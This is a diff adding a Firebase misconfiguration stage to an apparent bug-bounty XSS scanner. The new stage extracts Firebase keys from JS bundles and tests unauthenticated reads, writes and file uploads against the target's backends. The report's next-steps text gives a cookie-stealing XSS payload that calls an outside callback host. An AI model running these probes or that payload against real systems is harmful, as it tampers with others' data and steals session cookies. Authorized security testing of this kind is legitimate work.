@@ -403,8 +403,179 @@ def fuzz_with_dalfox(target, waf, oob=None, reflected=None):
     return xss_findings
 
 
+# ── Stage 7: Firebase Misconfiguration Detection ─────────────────────────────
+def check_firebase(js_findings):
+    log("info", "Checking for Firebase misconfiguration...")
+    firebase_findings = []
+
+    # Collect all JS bundle content already downloaded
+    bundle_dir = Path("/tmp/xss_bundles")
+    if not bundle_dir.exists():
+        log("warn", "No JS bundles cached — skipping Firebase check")
+        return firebase_findings
+
+    # Patterns to extract Firebase config values
+    config_patterns = {
+        "apiKey":        r'"apiKey"\s*:\s*"([^"]+)"',
+        "projectId":     r'"projectId"\s*:\s*"([^"]+)"',
+        "databaseURL":   r'"databaseURL"\s*:\s*"([^"]+)"',
+        "storageBucket": r'"storageBucket"\s*:\s*"([^"]+)"',
+        "authDomain":    r'"authDomain"\s*:\s*"([^"]+)"',
+    }
+
+    config = {}
+    for bundle_file in bundle_dir.glob("*.js"):
+        try:
+            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
+            if "firebaseConfig" not in content and "initializeApp" not in content:
+                continue
+            for key, pattern in config_patterns.items():
+                if key not in config:
+                    match = re.search(pattern, content)
+                    if match:
+                        config[key] = match.group(1)
+        except Exception:
+            continue
+
+    if not config:
+        log("info", "No Firebase config found in JS bundles")
+        return firebase_findings
+
+    log("warn", f"Firebase config found — projectId: {config.get('projectId','?')}")
+    firebase_findings.append({
+        "type": "firebase_config_exposed",
+        "severity": "INFO",
+        "detail": f"Firebase config exposed in JS bundle: {config}"
+    })
+
+    api_key    = config.get("apiKey", "")
+    project_id = config.get("projectId", "")
+    db_url     = config.get("databaseURL", "")
+    bucket     = config.get("storageBucket", "")
+
+    if not api_key or not project_id:
+        log("warn", "Incomplete Firebase config — skipping rule tests")
+        return firebase_findings
+
+    with httpx.Client(timeout=10, verify=False) as client:
+
+        # Test 1 — Firestore unauthenticated read
+        try:
+            fs_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
+            r = client.get(fs_url, params={"key": api_key})
+            if r.status_code == 200:
+                log("crit", f"Firestore OPEN READ — unauthenticated access to all documents")
+                firebase_findings.append({
+                    "type": "firebase_firestore_open_read",
+                    "severity": "CRITICAL",
+                    "detail": f"GET {fs_url} returned 200 without authentication",
+                    "evidence": r.text[:300]
+                })
+            elif r.status_code == 403:
+                log("good", "Firestore read: LOCKED (403)")
+            else:
+                log("info", f"Firestore read: {r.status_code}")
+        except Exception as e:
+            log("bad", f"Firestore read test failed: {e}")
+
+        # Test 2 — Firestore unauthenticated write
+        try:
+            fs_write_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/bb_test"
+            payload = {"fields": {"bb_probe": {"stringValue": "xsscan7r4ck_bb_test"}}}
+            r = client.post(fs_write_url, params={"key": api_key}, json=payload)
+            if r.status_code in (200, 201):
+                log("crit", f"Firestore OPEN WRITE — unauthenticated document creation confirmed")
+                firebase_findings.append({
+                    "type": "firebase_firestore_open_write",
+                    "severity": "CRITICAL",
+                    "detail": f"POST {fs_write_url} returned {r.status_code} without authentication",
+                    "evidence": r.text[:300]
+                })
+            elif r.status_code == 403:
+                log("good", "Firestore write: LOCKED (403)")
+            else:
+                log("info", f"Firestore write: {r.status_code}")
+        except Exception as e:
+            log("bad", f"Firestore write test failed: {e}")
+
+        # Test 3 — Realtime Database unauthenticated read
+        if db_url:
+            try:
+                rtdb_url = db_url.rstrip("/") + "/.json"
+                r = client.get(rtdb_url, params={"auth": api_key})
+                if r.status_code == 200 and r.text.strip() not in ("null", ""):
+                    log("crit", f"Realtime DB OPEN READ — data accessible without auth")
+                    firebase_findings.append({
+                        "type": "firebase_rtdb_open_read",
+                        "severity": "CRITICAL",
+                        "detail": f"GET {rtdb_url} returned data without authentication",
+                        "evidence": r.text[:300]
+                    })
+                elif r.status_code == 200 and r.text.strip() == "null":
+                    log("info", "Realtime DB: accessible but empty (null)")
+                elif r.status_code == 401:
+                    log("good", "Realtime DB read: LOCKED (401)")
+                else:
+                    log("info", f"Realtime DB read: {r.status_code}")
+            except Exception as e:
+                log("bad", f"RTDB read test failed: {e}")
+
+        # Test 4 — Firebase Storage unauthenticated list
+        if bucket:
+            try:
+                storage_url = f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o"
+                r = client.get(storage_url, params={"key": api_key})
+                if r.status_code == 200:
+                    items = r.json().get("items", [])
+                    log("crit" if items else "warn",
+                        f"Storage {'OPEN — ' + str(len(items)) + ' files listed' if items else 'accessible but empty'}")
+                    if items:
+                        firebase_findings.append({
+                            "type": "firebase_storage_open_list",
+                            "severity": "HIGH",
+                            "detail": f"Firebase Storage listing accessible without auth — {len(items)} files",
+                            "evidence": str([i.get("name") for i in items[:5]])
+                        })
+                elif r.status_code == 403:
+                    log("good", "Firebase Storage: LOCKED (403)")
+                else:
+                    log("info", f"Firebase Storage list: {r.status_code}")
+            except Exception as e:
+                log("bad", f"Storage list test failed: {e}")
+
+        # Test 5 — Firebase Storage unauthenticated upload
+        if bucket:
+            try:
+                upload_url = f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o"
+                r = client.post(
+                    upload_url,
+                    params={"key": api_key, "name": "bb_test/xsscan7r4ck.txt", "uploadType": "media"},
+                    headers={"Content-Type": "text/plain"},
+                    content=b"bug bounty probe - authorized test"
+                )
+                if r.status_code in (200, 201):
+                    log("crit", "Storage OPEN UPLOAD — unauthenticated file upload confirmed")
+                    firebase_findings.append({
+                        "type": "firebase_storage_open_upload",
+                        "severity": "HIGH",
+                        "detail": f"Unauthenticated file upload to Firebase Storage succeeded",
+                        "evidence": r.text[:300]
+                    })
+                elif r.status_code == 403:
+                    log("good", "Firebase Storage upload: LOCKED (403)")
+                else:
+                    log("info", f"Firebase Storage upload: {r.status_code}")
+            except Exception as e:
+                log("bad", f"Storage upload test failed: {e}")
+
+    crits = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
+    highs = [f for f in firebase_findings if f["severity"] == "HIGH"]
+    log("good", f"Firebase check complete — {len(crits)} CRITICAL, {len(highs)} HIGH")
+    return firebase_findings
+
+
 # ── Stage 6: Report Generation ────────────────────────────────────────────────
-def generate_report(target, waf, reflected, js_findings, xss_findings, output_file):
+def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings, output_file):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     total = len(xss_findings) + len([f for f in js_findings if f["severity"] == "HIGH"])
 
@@ -422,14 +593,22 @@ def generate_report(target, waf, reflected, js_findings, xss_findings, output_fi
         "",
     ]
 
-    if xss_findings:
-        lines.append(f"🔴 **{len(xss_findings)} confirmed XSS vulnerabilities** were found.")
+    fb_crits = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
+    fb_highs = [f for f in firebase_findings if f["severity"] == "HIGH"]
+    confirmed_xss = [f for f in xss_findings if f["type"] == "xss_confirmed"]
+
+    if confirmed_xss:
+        lines.append(f"🔴 **{len(confirmed_xss)} confirmed XSS vulnerabilities** were found.")
+    if fb_crits:
+        lines.append(f"🔴 **{len(fb_crits)} CRITICAL Firebase misconfigurations** found.")
+    if fb_highs:
+        lines.append(f"🟠 **{len(fb_highs)} HIGH Firebase misconfigurations** found.")
     high_sinks = [f for f in js_findings if f["severity"] == "HIGH"]
     if high_sinks:
         lines.append(f"🟠 **{len(high_sinks)} HIGH-severity DOM sinks** identified in JS bundles.")
-    if reflected and not xss_findings:
+    if reflected and not confirmed_xss:
         lines.append(f"🟡 **{len(reflected)} reflection points** found but no confirmed XSS yet — manual testing recommended.")
-    if not xss_findings and not reflected:
+    if not confirmed_xss and not reflected and not fb_crits:
         lines.append("🟢 No reflected XSS or confirmed DOM XSS found in automated scan.")
         lines.append("Manual testing of DOM sinks and JS bundles recommended.")
 
@@ -482,15 +661,43 @@ def generate_report(target, waf, reflected, js_findings, xss_findings, output_fi
             lines.append(f"- `{s['source']}` in `{bundle}`")
         lines.append("")
 
+    # Firebase section
+    lines += ["", "---", "", "## 4. Firebase Misconfiguration", ""]
+    if firebase_findings:
+        fb_config = [f for f in firebase_findings if f["type"] == "firebase_config_exposed"]
+        fb_vulns  = [f for f in firebase_findings if f["type"] != "firebase_config_exposed"]
+        if fb_config:
+            lines += ["### Config Found", ""]
+            lines.append(f"```\n{fb_config[0]['detail']}\n```")
+            lines.append("")
+        if fb_vulns:
+            lines += ["### Exploitable Misconfigurations", ""]
+            lines.append("| Severity | Type | Detail |")
+            lines.append("|---|---|---|")
+            for f in fb_vulns:
+                lines.append(f"| {f['severity']} | `{f['type']}` | {f['detail'][:100]} |")
+            lines.append("")
+            lines += ["### Evidence", ""]
+            for f in fb_vulns:
+                if f.get("evidence"):
+                    lines.append(f"**{f['type']}:**")
+                    lines.append(f"```\n{f['evidence']}\n```")
+                    lines.append("")
+        else:
+            lines.append("Firebase config found but all security rules are properly locked.")
+    else:
+        lines.append("No Firebase configuration detected in JS bundles.")
+
     lines += [
         "", "---", "",
-        "## 4. Next Steps",
+        "## 5. Next Steps",
         "",
         "1. **Manually trace** each HIGH-severity sink to its data source",
         "2. **Test DOM sinks** with context-specific payloads from the XSS methodology PDF",
         "3. **Check reflection points** that didn't confirm — try WAF bypass variants manually",
         "4. **Review source maps** if exposed — reconstruct original source for deeper analysis",
         "5. **Test OOB callbacks** by replacing `alert(1)` with `fetch('https://your.interactsh.com/?c='+document.cookie)`",
+        "6. **Firebase** — if misconfigs found, document the write/read with a screenshot for the report",
         "",
         "---",
         "",
@@ -555,22 +762,31 @@ def main():
     # Stage 5 — Dalfox fuzzing
     xss_findings = fuzz_with_dalfox(target, waf, oob=args.oob, reflected=reflected)
 
+    # Stage 7 — Firebase misconfiguration check
+    firebase_findings = []
+    if not args.skip_js:
+        firebase_findings = check_firebase(js_findings)
+
     # Stage 6 — Report
     elapsed = round(time.time() - start, 1)
     log("good", f"Scan complete in {elapsed}s")
     print()
     confirmed   = [f for f in xss_findings if f["type"] == "xss_confirmed"]
     unverified  = [f for f in xss_findings if f["type"] == "xss_poc_unverified"]
+    fb_crits    = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
+    fb_highs    = [f for f in firebase_findings if f["severity"] == "HIGH"]
     print(f"{BO}{'='*60}{RE}")
     print(f"  {R}XSS Confirmed:  {len(confirmed)} (browser-verified){RE}")
     print(f"  {Y}XSS PoC:        {len(unverified)} (needs manual verify){RE}")
     print(f"  {Y}Reflection pts: {len(reflected)}{RE}")
     print(f"  {Y}DOM Sinks:      {len([f for f in js_findings if f['type']=='dom_sink'])}{RE}")
+    print(f"  {R}Firebase Crit:  {len(fb_crits)}{RE}")
+    print(f"  {Y}Firebase High:  {len(fb_highs)}{RE}")
     print(f"  {B}WAF:            {waf.upper()}{RE}")
     print(f"{BO}{'='*60}{RE}")
     print()
 
-    generate_report(target, waf, reflected, js_findings, xss_findings, report_file)
+    generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings, report_file)
 
 
 if __name__ == "__main__":
